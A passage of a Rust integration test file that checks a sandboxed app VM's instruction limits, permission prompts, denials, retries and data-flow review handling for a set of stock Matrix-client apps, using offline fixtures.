//! Actual Splash VM + host bridge + Broker integration. Matrix/HTTP responses
//! are deterministic host fixtures; these tests do not contact a homeserver,
//! provider, OS dialog or internet service. The same FlowContract planner used
//! by Robrix resolves sources and recipients; Registry persists enforcement.

include!("support/stock_harness.rs");

#[test]
fn headless_guest_startup_keeps_the_instruction_ceiling_and_reports_errors_immediately() {
    let mut host = Harness::new();
    let failure = std::panic::catch_unwind(std::panic::AssertUnwindSafe(||
        host.launch("runaway-headless-fixture", false,
            "let total = 0\nfor i in 1000000 { total += i }\nLabel{text: \"should not reach this\"}")))
        .expect_err("a longer headless wall budget must not allow a runaway guest");
    let message = failure.downcast_ref::<String>().map(String::as_str)
        .or_else(|| failure.downcast_ref::<&str>().copied()).unwrap_or("");
    assert!(message.contains("source startup errors") && message.contains("script instruction limit exceeded"),
        "the actual Splash evaluator must report its instruction refusal at startup: {message}");
}

#[test]
fn headless_replies_and_timers_keep_the_instruction_ceiling() {
    let mut host = Harness::new();
    let (heap, _) = host.launch("runaway-timer-fixture", false,
        "let _tick = start_timeout(0.01, || { let total = 0\nfor i in 1000000 { total += i } })\nView{}");
    assert_eq!(host.cx.script_data.timers.timers.first().expect("the guest's timer").callback.heap_key(), heap);
    // Only the headless budget ends more than a second from now; the UI's ends after 64ms.
    let second = ScriptRunBudget::from_durations(std::time::Duration::from_secs(1), std::time::Duration::from_secs(1), 512).hard_deadline;
    let deadline = host.guest_work(heap, |cx| cx.with_vm(|vm| vm.bx.run_budget.as_ref().map(|budget| budget.hard_deadline)));
    assert!(deadline.is_some_and(|deadline| deadline > second), "replies and timers run under the headless wall budget");
    host.boot();
    let vm_id = host.cx.script_ref_vm_id(&host.splashes[0].view.source).unwrap();
    let errors = format!("{:?}", host.cx.with_script_vm_id_trusted(vm_id, |vm| vm.take_errors()));
    assert!(errors.contains("script instruction limit exceeded"), "a runaway timer still stops: {errors}");
}


#[test]
fn every_stock_app_runs_real_boot_and_finishes_parked_permission_callbacks() {
    run_every_stock_app(false);
}

#[test]
fn every_stock_app_finishes_its_primary_action_with_strict_permissions() {
    run_every_stock_app(true);
}

fn run_every_stock_app(strict: bool) {
    let stock = a2app_core::builtin::builtin_apps();
    assert_eq!(stock.len(), 24);
    // The A2UI app has no UI of its own; a2ui_runtime.rs drives its surfaces.
    for manifest in stock.into_iter().filter(|manifest| manifest.id != a2app_core::a2ui::APP_ID) {
        let mut host = Harness::new();
        host.permissions.set_strict(strict);
        // load_splash checks the real evaluator's source errors with its
        // 200,000-instruction guard and the headless wall budget. A separate
        // validator here would duplicate that parse under the UI's 64ms limit.
        let (app, _) = host.launch_stock_permissions(&manifest.id, false, false);
        host.boot();
        host.call(&app, "on_app_resize", &[460_f64.into(), 700_f64.into()]);
        let mut audit = StockAudit::default();
        host.settle_stock(&app, &manifest.id, &mut audit);
        let initial_prompts = audit.prompts.len();
        let initial_reviews = audit.reviews;
        match manifest.id.as_str() {
            "public-web" => { assert!(host.call(&app, "fetch_example", &[])); }
            "roll-call" => { assert!(host.call(&app, "roll", &[])); assert!(host.call(&app, "post", &[])); }
            "reminder" | "website-watch" | "keyword-alert" => {
                let setup = match manifest.id.as_str() { "reminder" => "test_reminder", "website-watch" => "test_website", _ => "test_alert" };
                assert!(host.call(&app, setup, &[]));
                host.settle_stock(&app, &manifest.id, &mut audit);
                assert!(audit.completions.is_empty(), "foreground setup must not pretend to complete a scheduled run");
                let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
                app.borrow_mut::<Splash>().unwrap().set_host_prompts(&mut host.cx, false);
                assert!(host.call_strings(&app, "on_background", &[r#"{"run_id":41,"messages":[{"body":"release today","is_own":false}]}"#]));
                host.settle_stock(&app, &manifest.id, &mut audit);
                assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants,
                    "{} runs unattended with the foreground setup grants", manifest.id);
            }
            "search" => { assert!(host.call_strings(&app, "run_search", &["release"])); }
            "account" => { assert!(host.call_strings(&app, "lookup", &["@alice:test"])); }
            "inspector" => { assert!(host.call_strings(&app, "pane_call", &["ui.pane.minimize"])); }
            "room-info" => { assert!(host.call(&app, "load", &[])); }
            "room-peek" => { assert!(host.call(&app, "jump_to_message", &[0_u32.into()])); }
            "room-members" => { assert!(host.call(&app, "open_member", &[0_u32.into()])); }
            "room-pins" => { assert!(host.call(&app, "jump_to_pin", &[0_u32.into()])); }
            "room-threads" => {
                assert!(host.call(&app, "open_thread", &[0_u32.into()]));
                host.settle_stock(&app, &manifest.id, &mut audit);
                assert!(host.call(&app, "open_in_robrix", &[]));
            }
            "presence" => { assert!(host.call(&app, "tap_cell", &[0_u32.into()])); }
            "room-tools" => { assert!(host.call(&app, "toggle", &[0_u32.into()])); }
            "spaces" => { assert!(host.call(&app, "tap_item", &[0_u32.into()])); }
            "inbox" => {
                assert!(host.call(&app, "pick_invite", &[0_u32.into()]));
                assert!(host.call(&app, "answer_invite", &[true.into()]));
            }
            "room-stats" => { assert!(host.call(&app, "open_sender", &[0_u32.into()])); }
            "simple-watcher" => {
                app.text_input(&host.cx, ids!(keyword_input)).set_text(&mut host.cx, "release");
                assert!(host.call(&app, "add_rule", &[]));
                assert!(host.call_strings(&app, "on_room_message", &[r#"[{"room_id":"!private:test","event_id":"$message:test","sender":"alice","sender_id":"@alice:test","sender_name":"Alice","body":"release today","ts":1,"msgtype":"m.text","is_own":false}]"#]));
            }
            "watcher" => {
                assert!(host.call_index_text(&app, "set_value", 0, "release"));
                assert!(host.call(&app, "save_rule", &[]));
                assert!(host.call_strings(&app, "on_room_message", &[r#"[{"room_id":"!private:test","event_id":"$message:test","sender":"alice","sender_id":"@alice:test","sender_name":"Alice","body":"release today","ts":1,"msgtype":"m.text","is_own":false}]"#]));
            }
            "link-library" => {
                assert!(host.call_strings(&app, "on_room_message", &[r#"[{"room_id":"!private:test","event_id":"$link:test","sender":"alice","sender_id":"@alice:test","sender_name":"Alice","body":"Notes: https://example.org/guide","ts":1720000000000,"msgtype":"m.text","is_own":false}]"#]));
                assert!(host.call(&app, "select_row", &[0_u32.into()]));
                assert!(host.call(&app, "show_in_chat", &[]));
            }
            "translator" => { assert!(host.call(&app, "set_live", &[true.into()])); }
            "room-gallery" => {
                host.queue_matrix_reply("matrix.room.event.read", serde_json::json!({"event_id":"$photo:test","room_id":ROOM,"sender":"alice","sender_id":"@alice:test","body":"cat.jpg","ts":1720000000000_u64,"msgtype":"m.image","media":{"uri":"mxc://media.test/cat","encrypted":false,"filename":"cat.jpg","mime_type":"image/jpeg","size":2048,"width":640,"height":480,"duration_ms":null},"edited":false,"reactions":[],"thread_root":null}));
                assert!(host.call_strings(&app, "on_room_message", &[r#"[{"room_id":"!private:test","event_id":"$photo:test","sender":"alice","sender_id":"@alice:test","sender_name":"Alice","body":"cat.jpg","ts":1720000000000,"msgtype":"m.image","is_own":false}]"#]));
                host.settle_stock(&app, &manifest.id, &mut audit);
                assert!(host.call(&app, "open_tile", &[0_u32.into()]));
                host.settle_stock(&app, &manifest.id, &mut audit);
                assert!(host.call(&app, "show_in_chat", &[]));
            }
            _ => {},
        }
        host.settle_stock(&app, &manifest.id, &mut audit);
        let expected = match manifest.id.as_str() {
            "public-web" | "reminder" | "roll-call" | "search" => (0, 1),
            "website-watch" | "keyword-alert" => (0, 2),
            "room-info" => (0, 0),
            "room-peek" | "room-members" | "room-threads" | "presence" | "link-library" | "room-gallery" => (2, 1),
            "account" | "inspector" | "room-pins" | "room-tools" | "spaces" | "inbox" | "room-stats" | "watcher" | "simple-watcher"
                | "translator" => (1, 1),
            _ => (1, 0),
        };
        eprintln!("stock permission audit: {} strict={} initial={} action={} initial_reviews={} action_reviews={}",
            manifest.id, strict, initial_prompts, audit.prompts.len() - initial_prompts, initial_reviews, audit.reviews - initial_reviews);
        if !strict { assert_eq!((initial_prompts, audit.prompts.len() - initial_prompts), expected,
            "{} initial and primary-action permission groups: {:?}", manifest.id, audit.prompts);
        let expected_reviews = match manifest.id.as_str() {
            "room-peek" | "presence" | "room-stats" | "spaces" => (1, 1),
            "room-threads" | "room-gallery" => (0, 2),
            "room-members" | "room-pins" | "room-tools" | "inbox" | "account" | "link-library" => (0, 1),
            _ => (0, 0),
        };
        assert_eq!((initial_reviews, audit.reviews - initial_reviews), expected_reviews,
            "{} must finish each reviewed sink without repeated reviews", manifest.id);
        }
        assert!(audit.prompts.len() <= manifest.permissions.len(), "{} exceeds its finite declared group budget", manifest.id);
        assert!(audit.prompts.iter().all(|permission| manifest.declares(*permission)), "{} prompts only for its declared groups", manifest.id);
        assert!(audit.reviews <= 3, "{} exceeds the finite review budget for its primary path", manifest.id);
        if matches!(manifest.id.as_str(), "reminder" | "keyword-alert" | "website-watch") {
            assert_eq!(audit.completions, [(41, true)], "{} completes its actual background callback", manifest.id);
            assert_eq!(audit.notifications.len(), 2, "foreground setup and unattended match both report");
        } else if manifest.id != "inspector" {
            assert!(!audit.services.is_empty() || !audit.subscriptions.is_empty(), "{} must complete a real service path", manifest.id);
        }
        if matches!(manifest.id.as_str(), "link-library" | "room-gallery") {
            assert_eq!(audit.actions, ["event"], "{} shows the tapped item's message in the chat", manifest.id);
        }
        // A grant to another app causes this same host hook in production.
        // Completed reads and subscriptions must not start again.
        let services = audit.services.len();
        let subscriptions = audit.subscriptions.len();
        host.publish_grants(&app, &manifest.id);
        host.settle_stock(&app, &manifest.id, &mut audit);
        assert_eq!(audit.services.len(), services, "{} reloads on an unrelated grant", manifest.id);
        assert_eq!(audit.subscriptions.len(), subscriptions, "{} subscribes again on an unrelated grant", manifest.id);
        let mut hooks = audit.subscriptions.clone(); hooks.sort(); hooks.dedup();
        assert_eq!(hooks.len(), audit.subscriptions.len(), "{} has duplicate subscriptions", manifest.id);
    }
}

#[test]
fn stock_spaces_loads_attached_space_after_its_environment_callback() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock("spaces", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "spaces", &mut audit);
    assert_eq!(audit.services, ["matrix.space.info.read", "matrix.space.rooms.list"]);
    assert_eq!(app.widget(&host.cx, ids!(status)).text(), "1 room · 2 members · Invite only");
}

fn grouped_stock_startups() -> Vec<(&'static str, Vec<Permission>, Permission)> {
    use Permission::*;
    vec![
        ("account", vec![MatrixProfile, MatrixAccountRead], MatrixProfile),
        ("inspector", vec![RobrixPreferences, RobrixObserve, DeviceInfo], RobrixPreferences),
        ("presence", vec![MatrixRoomRead, MatrixRoomWatch], MatrixRoomRead),
        ("room-members", vec![MatrixRoomRead, MatrixRoomWatch], MatrixRoomRead),
        ("room-pins", vec![MatrixRoomRead, MatrixRoomInfo], MatrixRoomRead),
        ("room-threads", vec![MatrixRoomRead, MatrixRoomWatch], MatrixRoomRead),
        ("room-peek", vec![MatrixRoomInfo, MatrixRoomRead, MatrixRoomWatch], MatrixRoomRead),
        ("room-stats", vec![MatrixRoomRead, MatrixRoomInfo, DeviceInfo], MatrixRoomRead),
        ("room-tools", vec![MatrixRoomRead, MatrixRoomInfo], MatrixRoomRead),
        ("link-library", vec![MatrixRoomRead, MatrixRoomWatch], MatrixRoomRead),
        ("translator", vec![MatrixRoomRead, DeviceInfo], MatrixRoomRead),
        ("room-gallery", vec![MatrixRoomRead, MatrixRoomWatch], MatrixRoomRead),
    ]
}

#[test]
fn grouped_stock_startups_finish_a_denial_and_refresh_after_a_new_approval() {
    for (app_id, expected, _) in grouped_stock_startups() {
        let mut host = Harness::new();
        let (app, _) = host.launch_stock_permissions(app_id, false, false);
        // Include ordinary abilities in the denied snapshot so the guest
        // callback cannot accidentally run them after a negative batch answer.
        for permission in &expected { host.permissions.set(app_id, *permission, GrantState::Denied); }
        host.publish_grants(&app, app_id);
        host.boot();
        let (request, perms) = host.take_stock_batch(app_id);
        assert_eq!(perms, expected, "{app_id} requests only its startup dependencies");
        let mut audit = StockAudit::default();
        host.answer_stock_batch(&app, app_id, request, &perms, &[], &mut audit);
        host.settle_stock(&app, app_id, &mut audit);
        assert!(!host.stock_callbacks_paused(), "{app_id} must finish a denied setup callback");
        assert!(audit.services.is_empty(), "{app_id} must not read rejected data");
        assert!(audit.subscriptions.is_empty(), "{app_id} must not subscribe to rejected hooks");
        assert_eq!(audit.batch_prompts, 1);
        host.publish_grants(&app, app_id);
        host.settle_stock(&app, app_id, &mut audit);
        assert_eq!(audit.batch_prompts, 1, "{app_id} cannot ask again from a permission-change callback");
        assert!(audit.services.is_empty());
        // The runtime separately tests trusted-input refusal clearing. This
        // VM fixture restores Ask to model that explicit retry's new snapshot.
        for permission in &perms { host.permissions.set(app_id, *permission, GrantState::Ask); }
        host.widget_click_any(&app, &["Ask again", "Refresh"], &[]);
        host.settle_stock(&app, app_id, &mut audit);
        assert!(!audit.services.is_empty(), "{app_id} must actually load its approved data");
        assert!(!host.stock_callbacks_paused());
        assert!(audit.batch_prompts <= 2, "{app_id} retry is at most one additional setup popup");
        let reads = audit.services.len();
        let hooks = audit.subscriptions.len();
        for permission in &perms { host.permissions.set(app_id, *permission, GrantState::Denied); }
        host.publish_grants(&app, app_id);
        host.settle_stock(&app, app_id, &mut audit);
        assert_eq!(audit.services.len(), reads, "{app_id} does not reread revoked data");
        assert_eq!(audit.subscriptions.len(), hooks, "{app_id} does not resubscribe while revoked");
        for permission in &perms { host.permissions.set(app_id, *permission, GrantState::Granted); }
        host.publish_grants(&app, app_id);
        host.settle_stock(&app, app_id, &mut audit);
        assert!(audit.services.len() > reads, "{app_id} refreshes after reapproval");
    }
}

#[test]
fn grouped_stock_startups_use_selected_reads_without_requesting_unselected_groups() {
    for (app_id, expected, read) in grouped_stock_startups() {
        let mut host = Harness::new();
        let (app, _) = host.launch_stock_permissions(app_id, false, false);
        for permission in &expected { host.permissions.set(app_id, *permission, GrantState::Denied); }
        host.publish_grants(&app, app_id);
        host.boot();
        let (request, perms) = host.take_stock_batch(app_id);
        assert_eq!(perms, expected);
        let mut audit = StockAudit::default();
        host.answer_stock_batch(&app, app_id, request, &perms, &[read], &mut audit);
        host.settle_stock(&app, app_id, &mut audit);
        assert_eq!(audit.batch_prompts, 1);
        assert_eq!(audit.prompts, [read], "{app_id} cannot silently grant an unselected group");
        assert!(!audit.services.is_empty(), "{app_id} must use its selected read");
        assert!(audit.subscriptions.iter().all(|hook|
            a2app_core::capabilities::for_hook(hook).unwrap().group == Some(read)),
            "{app_id} unselected live-update groups remain off");
        assert!(!host.stock_callbacks_paused());
        for permission in perms.into_iter().filter(|permission| *permission != read) {
            assert_eq!(host.permissions.state(app_id, permission), GrantState::Denied);
        }
        let reads = audit.services.len();
        host.publish_grants(&app, app_id);
        host.settle_stock(&app, app_id, &mut audit);
        assert_eq!(audit.services.len(), reads, "{app_id} does not reload a completed partial setup");
        assert_eq!(audit.batch_prompts, 1, "{app_id} cannot nag about unselected startup features");
    }
}

#[test]
fn other_stock_apps_finish_refusals_and_retry_from_visible_controls() {
    for app_id in ["public-web", "website-watch", "reminder", "keyword-alert", "roll-call", "room-info", "search", "watcher", "spaces", "inbox",
        "link-library", "translator", "room-gallery"]
    {
        let mut host = Harness::new();
        host.permissions.set_strict(true);
        let (app, _) = host.launch_stock_permissions(app_id, false, false);
        host.call(&app, "on_app_resize", &[460_f64.into(), 700_f64.into()]);
        host.boot();
        let control = match app_id {
            "public-web" => "Fetch example.com",
            "website-watch" => "Test report",
            "reminder" => "Test reminder",
            "keyword-alert" => "Test alert",
            "roll-call" => { assert!(host.call(&app, "roll", &[])); "Post to room" }
            // A refused first load shows only the empty state's retry.
            "room-info" => "Ask again",
            "search" => { app.text_input(&host.cx, ids!(q)).set_text(&mut host.cx, "release"); "Search" }
            "link-library" => "Ask again",
            _ => "Refresh",
        };
        if !matches!(app_id, "room-info" | "watcher" | "spaces" | "inbox" | "room-gallery" | "link-library") { host.widget_click(&app, control, &[]); }
        assert!(host.deny_stock_pending(&app, app_id) > 0, "{app_id} exposes its first needed permission");
        assert!(!host.stock_callbacks_paused(), "{app_id} refusal finishes the original callback");
        let failures = host.broker.failures();
        assert!(failures.iter().all(|failure| failure.error == "Permission denied."),
            "{app_id} reports only the deliberate fixture refusals");
        host.publish_grants(&app, app_id);
        for ask in host.process() { assert!(matches!(ask, BrokerAsk::Used { .. }), "{app_id} cannot automatically retry a denied request"); }
        let declared = host.apps.get(app_id).unwrap().permissions.clone();
        for permission in declared { host.permissions.set(app_id, Permission::from_str(&permission).unwrap(), GrantState::Ask); }
        // Public Web's refusal card retries from its Ask again button.
        host.widget_click(&app, if app_id == "public-web" { "Ask again" } else { control }, &[]);
        let mut audit = StockAudit::default();
        host.settle_stock(&app, app_id, &mut audit);
        assert!(!host.stock_callbacks_paused());
        assert!(!audit.services.is_empty() || !audit.subscriptions.is_empty() || !audit.notifications.is_empty(),
            "{app_id} visible retry must complete real approved work");
    }
}

#[test]
fn stock_thread_selection_ignores_replies_from_earlier_visits() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock("room-threads", false);
    host.flow.borrow_mut().set_policy(Source::Room { account: ACCOUNT.into(), room: ROOM.into() },
        FlowPolicy { recipients: [Recipient::network_origin("https://homeserver.test").unwrap()].into_iter().collect() }).unwrap();
    host.boot();
    for ask in host.process() {
        match ask {
            BrokerAsk::Matrix { reply, call: services::MatrixServiceCall::Threads { .. }, .. } => {
                let mut data = matrix_fixture(&services::MatrixServiceCall::Threads { limit: 20 });
                let mut second = data["threads"][0].clone();
                second["event_id"] = "$second:test".into();
                data["threads"].as_array_mut().unwrap().push(second);
                host.reply(reply, &data.to_string());
            }
            BrokerAsk::Subscribe { reply, .. } => host.reply(reply, r#"{"subscribed":true}"#),
            BrokerAsk::Used { .. } => {},
            _ => panic!("unexpected thread boot request"),
        }
    }
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "room-threads", &mut audit);
    let mut requests = Vec::new();
    // A -> B -> A must start each selected thread immediately, even while
    // earlier replies remain in flight. Matching only the target is not enough.
    for (index, event_id) in [(0_u32, "$message:test"), (1, "$second:test"), (0, "$message:test")] {
        assert!(host.call(&app, "open_thread", &[index.into()]));
        let (reply, call) = stock_matrix_requests(&mut host, 1).pop().unwrap();
        let services::MatrixServiceCall::ThreadReplies { event_id: target, .. } = call else { panic!("expected selected thread read") };
        assert_eq!(target, event_id);
        requests.push(reply);
    }
    for (index, count) in [(2, 2), (0, 1), (1, 3)] {
        let mut data = matrix_fixture(&services::MatrixServiceCall::ThreadReplies { event_id: "$message:test".into(), limit: 50 });
        let message = data["replies"][0].clone();
        data["replies"] = serde_json::Value::Array(vec![message; count]);
        host.reply(requests[index], &data.to_string());
        host.settle_stock(&app, "room-threads", &mut audit);
        assert_eq!(app.widget(&host.cx, ids!(thread_header)).text(), "2 replies", "an earlier visit must not replace the current thread");
    }
    host.settle_stock(&app, "room-threads", &mut audit);
}

#[test]
fn stock_space_selection_ignores_replies_from_earlier_visits() {
    fn loads(host: &mut Harness, expected: &str) -> (Reply, Reply) {
        let mut info = None;
        let mut rooms = None;
        for _ in 0..4 {
            let mut pending: VecDeque<_> = host.process().into();
            while let Some(ask) = pending.pop_front() { match ask {
                BrokerAsk::Matrix { reply, call: services::MatrixServiceCall::SpaceInfo { space_id }, .. } => {
                    assert_eq!(space_id, expected);
                    assert!(info.replace(reply).is_none());
                }
                BrokerAsk::Matrix { reply, call: services::MatrixServiceCall::SpaceRooms { space_id }, .. } => {
                    assert_eq!(space_id, expected);
                    assert!(rooms.replace(reply).is_none());
                }
                BrokerAsk::FlowReview { request, review } => {
                    assert_eq!(request.service, "matrix.space_rooms");
                    let args: serde_json::Value = serde_json::from_str(&request.args_json).unwrap();
                    assert_eq!(args["space_id"], expected);
                    assert_eq!(review.context, host.contexts[&request.heap_key]);
                    assert_eq!(review.recipient, Some(Recipient::NetworkOrigin("https://homeserver.test".into())));
                    assert!(review.action.is_none());
                    assert!(!review.allowed);
                    host.flow.borrow_mut().approve_effect_session(&review, SharingDuration::RobrixSession).unwrap();
                    pending.extend(host.dispatch(Some(request)));
                }
                BrokerAsk::Used { .. } => {},
                _ => panic!("unexpected space navigation request"),
            } }
            if info.is_some() && rooms.is_some() { break; }
        }
        (info.expect("new space starts its details read"), rooms.expect("new space starts its room-list read"))
    }
    let mut host = Harness::new();
    let (app, _) = host.launch_stock("spaces", false);
    host.boot();
    let (old_info, old_rooms) = loads(&mut host, "!space:test");
    host.reply(old_rooms, r#"{"rooms":[{"room_id":"!child:test","name":"Child space","topic":"","member_count":1,"is_space":true,"joined":true}]}"#);
    host.settle_stock(&app, "spaces", &mut StockAudit::default());
    assert!(host.call(&app, "tap_item", &[0_u32.into()]));
    let (child_info, child_rooms) = loads(&mut host, "!child:test");
    assert!(host.call(&app, "go_back", &[]));
    let (current_info, current_rooms) = loads(&mut host, "!space:test");
    host.reply(current_info, r#"{"children_count":2,"member_count":2,"join_rule":"invite","topic":"current visit"}"#);
    let mut rooms = matrix_fixture(&services::MatrixServiceCall::SpaceRooms { space_id: "!space:test".into() });
    let room = rooms["rooms"][0].clone();
    rooms["rooms"].as_array_mut().unwrap().push(room);
    host.reply(current_rooms, &rooms.to_string());
    host.settle_stock(&app, "spaces", &mut StockAudit::default());
    for (reply, data) in [
        (old_info, r#"{"children_count":1,"member_count":1,"join_rule":"public","topic":"earlier visit"}"#.to_owned()),
        (child_info, r#"{"children_count":1,"member_count":1,"join_rule":"public","topic":"child space"}"#.to_owned()),
        (child_rooms, matrix_fixture(&services::MatrixServiceCall::SpaceRooms { space_id: "!child:test".into() }).to_string()),
    ] {
        host.reply(reply, &data);
        host.settle_stock(&app, "spaces", &mut StockAudit::default());
        assert_eq!(app.widget(&host.cx, ids!(space_topic)).text(), "current visit");
        assert_eq!(app.widget(&host.cx, ids!(status)).text(), "2 rooms · 2 members · Invite only", "stale space replies must not replace the current visit");
    }
    host.settle_stock(&app, "spaces", &mut StockAudit::default());
}

#[test]
fn stock_navigation_membership_and_room_management_complete_after_review() {
    for (app_id, function, argument, expected_action, expected_service) in [
        ("room-members", "open_member", 0_u32, Some("user"), None),
        ("room-pins", "jump_to_pin", 0, Some("event"), None),
        ("room-peek", "jump_to_message", 0, Some("event"), None),
        ("presence", "tap_cell", 0, Some("user"), None),
        ("spaces", "tap_item", 0, Some("room"), None),
        ("inbox", "open_room", 0, Some("room"), None),
        ("room-tools", "toggle", 0, None, Some("matrix.room.favorite.set")),
        ("room-tools", "toggle_pin", 0, None, Some("matrix.room.pin.set")),
        ("room-stats", "open_sender", 0, Some("user"), None),
    ] {
        let mut host = Harness::new();
        let (app, _) = host.launch_stock_permissions(app_id, false, false);
        host.boot();
        let mut audit = StockAudit::default();
        host.settle_stock(&app, app_id, &mut audit);
        let before = audit.services.len();
        let reviews = audit.reviews;
        assert!(host.call(&app, function, &[argument.into()]));
        host.settle_stock(&app, app_id, &mut audit);
        if let Some(action) = expected_action { assert_eq!(audit.actions, [action], "{app_id}.{function}"); }
        if let Some(service) = expected_service { assert_eq!(&audit.services[before..], [service], "{app_id}.{function}"); }
        assert!(audit.reviews - reviews <= 1, "{app_id}.{function} needs at most one combined flow review");
        let prompts = audit.prompts.len();
        let reviews = audit.reviews;
        let actions = audit.actions.len();
        let services = audit.services.len();
        // Model a subsequent user operation after the rate-limit bucket
        // refills, while preserving every permission and flow session grant.
        host.broker.forget_app(app_id);
        assert!(host.call(&app, function, &[argument.into()]));
        host.settle_stock(&app, app_id, &mut audit);
        assert_eq!(audit.prompts.len(), prompts, "{app_id}.{function} repeats no granted permission prompt");
        assert_eq!(audit.reviews, reviews, "{app_id}.{function} keeps its approved session flow");
        if expected_action.is_some() { assert_eq!(audit.actions.len(), actions + 1, "{app_id}.{function} must navigate again"); }
        if expected_service.is_some() { assert_eq!(audit.services.len(), services + 1, "{app_id}.{function} must act again"); }
    }
    let mut host = Harness::new();
    let (app, _) = host.launch_stock("room-threads", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "room-threads", &mut audit);
    assert!(host.call(&app, "open_thread", &[0_u32.into()]));
    host.settle_stock(&app, "room-threads", &mut audit);
    assert!(audit.services.contains(&"matrix.room.thread.read".into()));
    assert!(host.call(&app, "open_in_robrix", &[]));
    host.settle_stock(&app, "room-threads", &mut audit);
    assert_eq!(audit.actions, ["thread"]);
}

#[test]
fn stock_room_peek_send_keeps_its_callback_until_one_combined_review_then_finishes() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock("room-peek", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "room-peek", &mut audit);
    let sharing_grants = host.flow.borrow().sharing_grants().unwrap();
    let action_grants = host.flow.borrow().authorities().unwrap();
    app.text_input(&host.cx, ids!(msg_input)).set_text(&mut host.cx, "Please post this exact text");
    host.flow.borrow_mut().add_sources(&context, [Source::Account { account: ACCOUNT.into() }]).unwrap();
    assert!(host.call(&app, "send_msg", &[]));
    let (request, review) = effect_review(host.process());
    assert_eq!(request.service, "matrix.send_message");
    assert!(review.sources.contains(&Source::Account { account: ACCOUNT.into() }));
    assert!(!review.influences.is_empty());
    assert!(review.payload.contains("Please post this exact text"));
    assert_eq!(app.widget(&host.cx, ids!(send_note)).text(), "Sending…");
    host.flow.borrow_mut().approve_effect_once(&review).unwrap();
    let (reply, body) = stock_send(host.dispatch(Some(request)));
    assert_eq!(body, "Please post this exact text");
    host.reply(reply, "{}");
    host.cx.with_vm_and_async(|_| {});
    host.settle_stock(&app, "room-peek", &mut audit);
    assert_eq!(app.widget(&host.cx, ids!(send_note)).text(), "Sent!");
    assert_eq!(app.text_input(&host.cx, ids!(msg_input)).text(), "");
    assert_eq!(host.flow.borrow().sharing_grants().unwrap(), sharing_grants, "allow once makes no lasting sharing rule");
    assert_eq!(host.flow.borrow().authorities().unwrap(), action_grants, "allow once makes no session action grant");
}

#[test]
fn stock_roll_call_first_post_finishes_after_enabling_matrix_writes() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock_permissions("roll-call", false, false);
    host.permissions.set_matrix_write(false);
    assert!(host.call(&app, "roll", &[]));
    assert!(host.call(&app, "post", &[]));
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "roll-call", &mut audit);
    assert_eq!(audit.write_setups, 1);
    assert_eq!(audit.services, ["matrix.room.message.send"]);
    assert_eq!(app.widget(&host.cx, ids!(note)).text(), "Posted to the room!");
    assert!(host.call(&app, "post", &[]));
    host.settle_stock(&app, "roll-call", &mut audit);
    assert_eq!(audit.write_setups, 1, "subsequent posts keep the user's write setup choice");
    assert_eq!(audit.services.len(), 2);
}

#[test]
fn stock_simple_watcher_saves_without_write_permission_and_tests_only_the_selected_rule_actions() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock_permissions("simple-watcher", false, false);
    host.permissions.set_matrix_write(false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "simple-watcher", &mut audit);
    app.text_input(&host.cx, ids!(keyword_input)).set_text(&mut host.cx, "release");
    app.text_input(&host.cx, ids!(reply_input)).set_text(&mut host.cx, "Thanks for the release update");
    host.flow.borrow_mut().add_sources(&context, [Source::Account { account: ACCOUNT.into() }]).unwrap();
    assert!(host.call(&app, "add_rule", &[]));
    host.settle_stock(&app, "simple-watcher", &mut audit);
    assert_eq!(audit.write_setups, 0, "saving a rule cannot enable Matrix writes");
    assert!(audit.notifications.is_empty());
    assert!(audit.services.is_empty());
    assert!(host.call_object(&app, "test_rule", r#"{"keyword":"release","notify":true,"reply":"Thanks for the release update"}"#));
    host.settle_stock(&app, "simple-watcher", &mut audit);
    assert_eq!(audit.batch_prompts, 0, "an already approved watcher needs no new blanket setup");
    assert_eq!(audit.write_setups, 1, "testing a reply explicitly enables writes and grants its declared room-send ability");
    assert_eq!(audit.notifications, ["Simple Watcher test: Test alert for 'release'."]);
    assert_eq!(audit.services, ["matrix.room.message.send"]);
    host.flow.borrow_mut().add_sources(&context, [Source::Room { account: ACCOUNT.into(), room: ROOM.into() }]).unwrap();
    host.flow.borrow_mut().add_influences(&context, [Influence::RoomContent { account: ACCOUNT.into(), room: ROOM.into() }]).unwrap();
    assert!(host.call_strings(&app, "on_room_message", &[r#"[{"event_id":"$message:test","sender_name":"Alice","body":"release today","is_own":false}]"#]));
    host.settle_stock(&app, "simple-watcher", &mut audit);
    host.boot(); // The notification callback paces the queued reply with a timer.
    host.settle_stock(&app, "simple-watcher", &mut audit);
    assert_eq!(audit.notifications, ["Simple Watcher test: Test alert for 'release'.", "Simple Watcher: release: Alice: release today"]);
    assert_eq!(audit.services, ["matrix.room.message.send", "matrix.room.message.send"]);
    let reviews = audit.reviews;
    assert!((1..=2).contains(&reviews), "the test and first influenced reply each have at most one combined review");
    host.boot(); // Finish the action pacing timer before delivering another batch.
    assert!(host.call_strings(&app, "on_room_message", &[r#"[{"event_id":"$message:test","sender_name":"Alice","body":"release tomorrow","is_own":false}]"#]));
    host.settle_stock(&app, "simple-watcher", &mut audit);
    host.boot();
    host.settle_stock(&app, "simple-watcher", &mut audit);
    assert_eq!(audit.reviews, reviews, "session permission prevents repeated auto-reply reviews");
    assert_eq!(audit.services.len(), 3);
    assert_eq!(audit.write_setups, 1, "automatic replies reuse the approved write setup");
}

#[test]
fn stock_simple_watcher_matches_rows_without_a_display_name() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock_permissions("simple-watcher", false, false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "simple-watcher", &mut audit);
    app.text_input(&host.cx, ids!(keyword_input)).set_text(&mut host.cx, "release");
    assert!(host.call(&app, "add_rule", &[]));
    // A row without sender_name used to be a script error; the short sender stands in.
    assert!(host.call_strings(&app, "on_room_message", &[r#"[{"event_id":"$message:test","sender":"alice","body":"release today","is_own":false}]"#]));
